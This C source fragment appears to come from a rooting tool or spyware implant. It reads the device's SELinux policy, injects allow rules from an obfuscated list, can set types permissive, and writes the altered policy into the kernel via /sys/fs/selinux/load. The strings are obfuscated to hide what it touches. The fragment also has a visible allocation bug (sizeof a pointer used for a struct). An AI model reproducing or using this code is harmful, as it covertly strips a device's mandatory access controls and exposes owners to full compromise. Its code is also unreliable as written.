void *cmalloc(size_t s) {
  void *t = malloc(s);
  if (t == NULL) {
    LOGD("Out of memory\n");
    exit(1);
  }
  return t;
}

int add_rule(char *s, char *t, char *c, char *p, policydb_t *policy) {
  type_datum_t *src, *tgt;
  class_datum_t *cls;
  perm_datum_t *perm;
  avtab_datum_t *av;
  avtab_key_t key;

  src = hashtab_search(policy->p_types.table, s);
  if (src == NULL) {
    LOGD("source type %s does not exist\n", s);
    return 2;
  }
  tgt = hashtab_search(policy->p_types.table, t);
  if (tgt == NULL) {
    LOGD("target type %s does not exist\n", t);
    return 2;
  }
  cls = hashtab_search(policy->p_classes.table, c);
  if (cls == NULL) {
    LOGD("class %s does not exist\n", c);
    return 2;
  }
  perm = hashtab_search(cls->permissions.table, p);
  if (perm == NULL) {
    if (cls->comdatum == NULL) {
      LOGD("perm %s does not exist in class %s\n", p, c);
      return 2;
    }
    perm = hashtab_search(cls->comdatum->permissions.table, p);
    if (perm == NULL) {
      LOGD("perm %s does not exist in class %s\n", p, c);
      return 2;
    }
  }

  // See if there is already a rule
  key.source_type = src->s.value;
  key.target_type = tgt->s.value;
  key.target_class = cls->s.value;
  key.specified = AVTAB_ALLOWED;
  av = avtab_search(&policy->te_avtab, &key);

  if (av == NULL) {
    av = cmalloc(sizeof av);
    av->data |= 1U << (perm->s.value - 1);
    int ret = avtab_insert(&policy->te_avtab, &key, av);
    if (ret) {
      LOGD("Error inserting into avtab\n");
      return 1;
    }	
  }

  av->data |= 1U << (perm->s.value - 1);

  return 0;
}

int load_policy(char *filename, policydb_t *policydb, struct policy_file *pf) {
  int fd;
  struct stat sb;
  void *map;
  int ret;

  fd = open(filename, O_RDONLY);
  if (fd < 0) {
    LOGD("Can't open '%s':  %s\n",
	 filename, strerror(errno));
    return 1;
  }
  if (fstat(fd, &sb) < 0) {
    LOGD("Can't stat '%s':  %s\n",
	 filename, strerror(errno));
    return 1;
  }
  map = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE,
	     fd, 0);
  if (map == MAP_FAILED) {
    LOGD("Can't mmap '%s':  %s\n",
	 filename, strerror(errno));
    close(fd);
    return 1;
  }

  policy_file_init(pf);
  pf->type = PF_USE_MEMORY;
  pf->data = map;
  pf->len = sb.st_size;
  if (policydb_init(policydb)) {
    LOGD("policydb_init: Out of memory!\n");
    munmap(map, sb.st_size);
    close(fd);
    return 1;
  }
  ret = policydb_read(policydb, pf, 1);
  if (ret) {
    LOGD("error(s) encountered while parsing configuration\n");
    munmap(map, sb.st_size);
    close(fd);
    return 1;
  }

  munmap(map, sb.st_size);
  close(fd);
  return 0;
}

int load_policy_into_kernel(policydb_t *policydb) {
  unsigned char load[] = "\x4b\x47\x18\xec\x38\x3e\x38\xec\x33\x38\xec\x38\x32\x29\x2e\x2b\xc2\x3d\xec\x29\x2c\x36\x31"; // "/sys/fs/selinux/load"

  char *filename = deobfuscate(load);
  int fd, ret;
  void *data = NULL;
  size_t len;

  policydb_to_image(NULL, policydb, &data, &len);

  // based on libselinux security_load_policy()
  fd = open(filename, O_RDWR);
  if (fd < 0) {
    LOGD("Can't open '%s':  %s\n",
	    filename, strerror(errno));
    return 1;
  }
  ret = write(fd, data, len);
  close(fd);
  if (ret < 0) {
    LOGD("Could not write policy to %s\n",
	    filename);
    return 1;
  }
  return 0;
}

int parse_add_rules(void) {
  char *policy = deobfuscate(obf_policy); 
  char *permissive = NULL;
  
  policydb_t policydb;
  struct policy_file pf, outpf;
  sidtab_t sidtab;
  int ch;
  int load = 0;
  FILE *fp;
  
  sepol_set_policydb(&policydb);
  sepol_set_sidtab(&sidtab);

  if (load_policy(policy, &policydb, &pf)) {
    LOGD("Could not load policy\n");
    return 1;
  }

  if (policydb_load_isids(&policydb, &sidtab))
    return 1;
  
  int n = sizeof(pol_list)/POLSIZE;
  int i = 0;
  char *rule = NULL;

  for(i = 0; i < n; i++) {
    rule = deobfuscate(pol_list[i]);
  
    char *req = strtok(rule, ":");
    if(req == NULL) {
      LOGD("No request\n");
      continue;
    }
    
    char *source = strtok(NULL, ":");
    if(source == NULL) {
      LOGD("No source\n");
      continue;
    }

    char *target = strtok(NULL, ":");
    if(target == NULL) {
      LOGD("No target\n");
      continue;
    }

    char *class = strtok(NULL, ":");
    if(class == NULL) {
      LOGD("No class\n");
      continue;
    }
  
    char *perm = strtok(NULL, ":");
    if(perm == NULL) {
      LOGD("No perm\n");
      continue;
    }

    if ((!source || !target || !class || !perm) && !permissive)
      continue;
    
    if (permissive) {
      type_datum_t *type;
      type = hashtab_search(policydb.p_types.table, permissive);
      if (type == NULL) {
	LOGD("type %s does not exist\n", permissive);
	continue;
      }
      if (ebitmap_set_bit(&policydb.permissive_map, type->s.value, 1)) {
	LOGD("Could not set bit in permissive map\n");
	continue;
      }
    } else {
      int ret_add_rule;
      if (ret_add_rule = add_rule(source, target, class, perm, &policydb)) {
	LOGD("Could not add rule\n");
	continue;
      }
    }
  }
  if (load_policy_into_kernel(&policydb)) {
    LOGD("Could not load new policy into kernel\n");
    return 1;
  }
  
  policydb_destroy(&policydb);

  return 0;
}


void adjust_selinux_policy(void) {

  struct stat fileStat;
  if(stat(deobfuscate(obf_policy),&fileStat) < 0) {
    LOGD("SELinux not presents\n");
    return;
  }

  parse_add_rules();

}
